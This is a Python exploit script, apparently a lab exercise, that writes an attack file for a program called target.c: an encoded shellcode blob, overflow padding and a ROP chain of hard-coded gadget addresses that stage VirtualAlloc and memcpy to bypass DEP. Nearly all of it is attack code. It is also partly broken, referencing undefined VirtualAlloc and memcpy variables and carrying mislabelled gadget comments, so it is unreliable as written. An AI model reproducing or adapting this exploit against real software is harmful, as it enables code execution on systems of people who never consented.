import random,struct
print("attack target.c")
#buf= b"1234567890ABCDEFGHIGKLM\n"

shellcode  =(b'\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49')
shellcode  +=(b'\x49\x49\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36')
shellcode  +=(b'\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34\x41\x32')
shellcode  +=(b'\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41\x56\x58\x34\x5a')
shellcode  +=(b'\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x54\x42\x50\x42\x50\x42\x30')
shellcode  +=(b'\x4b\x58\x45\x34\x4e\x33\x4b\x38\x4e\x37\x45\x30\x4a\x57\x41\x30\x4f\x4e')
shellcode  +=(b'\x4b\x48\x4f\x44\x4a\x31\x4b\x38\x4f\x45\x42\x52\x41\x30\x4b\x4e\x49\x54')
shellcode  +=(b'\x4b\x38\x46\x53\x4b\x48\x41\x30\x50\x4e\x41\x33\x42\x4c\x49\x59\x4e\x4a')
shellcode  +=(b'\x46\x38\x42\x4c\x46\x47\x47\x30\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c')
shellcode  +=(b'\x4b\x4e\x46\x4f\x4b\x53\x46\x45\x46\x32\x46\x50\x45\x37\x45\x4e\x4b\x48')
shellcode  +=(b'\x4f\x45\x46\x42\x41\x30\x4b\x4e\x48\x46\x4b\x38\x4e\x50\x4b\x44\x4b\x58')
shellcode  +=(b'\x4f\x45\x4e\x41\x41\x50\x4b\x4e\x4b\x48\x4e\x51\x4b\x38\x41\x50\x4b\x4e')
shellcode  +=(b'\x49\x48\x4e\x35\x46\x52\x46\x50\x43\x4c\x41\x33\x42\x4c\x46\x56\x4b\x38')
shellcode  +=(b'\x42\x34\x42\x53\x45\x38\x42\x4c\x4a\x37\x4e\x50\x4b\x38\x42\x54\x4e\x50')
shellcode  +=(b'\x4b\x48\x42\x37\x4e\x31\x4d\x4a\x4b\x48\x4a\x46\x4a\x50\x4b\x4e\x49\x30')
shellcode  +=(b'\x4b\x38\x42\x48\x42\x4b\x42\x30\x42\x30\x42\x30\x4b\x38\x4a\x36\x4e\x33')
shellcode  +=(b'\x4f\x55\x41\x53\x48\x4f\x42\x46\x48\x45\x49\x48\x4a\x4f\x43\x58\x42\x4c')
shellcode  +=(b'\x4b\x37\x42\x55\x4a\x56\x42\x4f\x4c\x58\x46\x30\x4f\x35\x4a\x46\x4a\x49')
shellcode  +=(b'\x50\x4f\x4c\x38\x50\x50\x47\x55\x4f\x4f\x47\x4e\x43\x56\x41\x46\x4e\x36')
shellcode  +=(b'\x43\x46\x42\x30\x5a')
buf= b"12345678123456781234567812345678123456781234567890ABCDEFGHIGKLMABCDEFGHHIJKLMNOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
stack_frame=shellcode+buf[len(shellcode):1044]
print(len(stack_frame))
print(len(shellcode))

#VirtualAlloc -> ESI
#memcpy 0x7c921db3 -> EDI
#dwSize (0x343) -> EBX
#flProtect (0x40) -> EDX
#flAllocationType (0x1000) -> ECX
#lpAddress (0x00191000h) -> EAX
#shellcode_addr (0x0022EB24) -> EBP


rop=struct.pack('<L',0x41414141) # padding to compensta ESP,EBP?

#------------------------------------[VirtualAlloc -> ESI]-#
rop+=struct.pack('<L',0x77BF1891) #POP ESI#RETN
rop+=struct.pack('<L',0x7c809af1) #VirtualAlloc ->ESI

#------------------------------------[memcpy -> EDI]-#
rop+=struct.pack('<L',0x77BF3B47) #POP EDI#RETN
rop+=struct.pack('<L',0x7c921db3) #0x7c921db3

#------------------------------------[dwSize (0x343) -> EBX]-#
rop+=struct.pack('<L',0x77BF362C) #POP EBX#RETN
rop+=struct.pack('<L',0x00000157)

#--------------------------------[flProtect (0x40) -> EDX]-#
rop+=struct.pack('<L',0x77C221EE) # POP ECX # RETN ???
rop+=struct.pack('<L',0xffffffff) # ->0x40
rop+=struct.pack('<L',0x7C98301F) #INC ECX #RETN
rop+=struct.pack('<L',0x7C98301F) #INC ECX #RETN
rop+=struct.pack('<L',0x77C1AF07) #ADD ECX,ECX#RETN
rop+=struct.pack('<L',0x77C1AF07) #ADD ECX,ECX#RETN
rop+=struct.pack('<L',0x77C1AF07) #ADD ECX,ECX#RETN
rop+=struct.pack('<L',0x77C1AF07) #ADD ECX,ECX#RETN
rop+=struct.pack('<L',0x77C1AF07) #ADD ECX,ECX#RETN
rop+=struct.pack('<L',0x77C1AF07) #ADD ECX,ECX#RETN2^6 0x40
rop+=struct.pack('<L',0x7C922B50) #MOV EDX,ECX#RETN flProtect (0x40) -> EDX
rop+=struct.pack('<L',0x77C1AF07) #ADD ECX,ECX#RETN
rop+=struct.pack('<L',0x77C1AF07) #ADD ECX,ECX#RETN
rop+=struct.pack('<L',0x77C1AF07) #ADD ECX,ECX#RETN
rop+=struct.pack('<L',0x77C1AF07) #ADD ECX,ECX#RETN
rop+=struct.pack('<L',0x77C1AF07) #ADD ECX,ECX#RETN
rop+=struct.pack('<L',0x77C1AF07) #ADD ECX,ECX#RETN 2^12 0x1000
#-----------------------[flAllocationType (0x1000) -> ECX]-#


#-----------------------[lpAddress (0x00191000h) -> EAX]-#
rop+=struct.pack('<L',0x77BF1D16) #POP EAX #RETN
rop+=struct.pack('<L',0x00191000)

#-----------------------[shellcode_addr (0x0022EB24) -> EBP]-#
rop+=struct.pack('<L',0x7C994188) #POP EAX #RETN
rop+=struct.pack('<L',0x0022EB24)

print('ROP len is ', len(rop))

file=open('hack_toy.txt','wb')
file.write(stack_frame);
file.write(b"\x41\x42\x43\x44"); #EBP
file.write(VirtualAlloc);
file.write(memcpy);

file.write(rop)

file.close();


